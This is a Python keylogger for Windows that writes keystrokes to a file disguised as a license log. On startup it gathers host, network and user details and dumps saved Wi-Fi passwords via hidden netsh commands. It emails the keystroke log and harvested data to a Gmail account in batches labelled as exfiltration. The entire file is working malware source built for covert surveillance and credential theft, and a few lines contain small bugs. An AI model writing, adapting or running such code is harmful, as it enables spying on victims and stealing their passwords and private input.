import tkinter as tk
from pynput.keyboard import Key, Listener
import logging
import os
import smtplib
from email.mime.text import MIMEText
import time
import socket
import getpass
from uuid import getnode as get_mac
import subprocess
import threading

existing_file_path = "license_win64_details.txt"
if os.path.exists(existing_file_path):
	os.remove(existing_file_path)

logging.basicConfig(filename=("license_win64_details.txt"), level=logging.DEBUG, format="%(message)s")
GMAIL_USERNAME = "example@gmail.com"
GMAIL_APP_PASSWORD = "Example12321"
recipients = "recipient@gmail.com"
email_count = 1

def get_host_info():
	host_name = socket.gethostname()
	host_ip = socket.gethostbyname(host_name)
	network_name = os.getenv('COMPUTERNAME')
	mac_address = ':'.join(("%012X" % get_mac()) [i:i+2] for i in range (0, 12, 2))
	username = getpass.getuser()
	return {
		"Host Name": host_name,
		"LAN IP": host_ip,
		"Network SSID": network_name,
		"MAC Address": mac_address,
		"Username": username
	}

def get_wifi_profiles():
	data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8').split('\n')
	profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
	wifi_info = { }

	for i in profiles:
		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8').split('\n')
		results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
		try:
			wifi_info[i] = results[0]
		except IndexError:
			wifi_info[i] = ""
	return wifi_info

def write_info_to_file():
	host_info = get_host_info()
	wifi_profiles = get_wifi_profiles()

	with open('win64_temp.txt', 'w') as file:
		for key, value in host_info.items():
			file.write(f"{key}: {value}\n")
	
		file.write("\nWiFi Profiles:\n")
		for profile, password in wifi_profiles.items():
			file.write(f"{profile}: {password}\n")
	
		current_dir = os.getcwd()
		username = os.getlogin()
		files_in_directory = os.listdir(current_dir)
		os_name = os.name
	
		file.write("\nCurrent Directory: " + current_dir + "\n")
		file.write("Username: " + username + "\n")
		file.write("Files in Directory: " + ', '.join(files_in_directory) + "\n")
		file.write("OS Name: " + os_name + "\n")

	with open('win64_temp.txt', 'r') as file:
		file_content = file.read()
	send_email(file_content)
	os.remove('win64_temp.txt')

def show_message_popup(message):
	popup = tk.Tk()
	popup.tile(" [salt] - Keylogger Terminated.")
	popup.geometry("755x410")
	text_widget = tk.Text(popup, wrap=tk.NONE, font=("Courier", 8), width=120, height=40)
	text_widget.insert(tk.END, message)
	text_widget.pack()
	text_widget.config(bg="black", fg="green")
	popup.wm_attributes('-topmost', 1)
	popup.mainloop()
	listener.stop()
	listener.join()

def send_email(file_content):
	global email_count
	msg = MIMEText(file_content)
	msg["Subject"] = f" [salt] (D-EXFIL #{email_count})"
	msg["To"] = ", ".join(recipients)
	msg["From"] = f"{GMAIL_USERNAME}@gmail.com"
	smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	smtp_server.login(GMAIL_USERNAME, GMAIL_APP_PASSWORD)
	smtp_server.sendmail(msg["From"], recipients, msg.as_string())
	smtp_server.quit()
	email_count += 1

def clear_log_file(file_path):
	with open(file_path, "w") as file:
		file.truncate(0)

def on_press(key):
	file_path = "license_win64_details.txt"
	if key == Key.ctrl_r:
		with open(file_path, "r") as file:
			file_content = file.read()
		send_email(file_content)	
		ascii_art = """ easter egg ascii """
		show_message_popup(ascii_art)
		listener.stop()
	else:
		try:
			logging.info(str(key))
		except Exception as e:
			logging.info("error")
		if os.path.getsize(file_path) >= 500:
			with open(file_path, "r") as file:
				file_content = file.read()
			send_email(file_content)
			clear_log_file(file_path)

def listener_thread():
	listener = Listener(on_press=on_press)
	listener.start()

def main_loop():
	while True:
		time.sleep(20)

if __name__ == "__main__":
	write_info_to_file()
	listener_thread = threading.Thread(target=listener_thread)
	listener_thread.start()
	
	main_loop_thread = threading.Thread(target=main_loop)
	main_loop_thread.start()
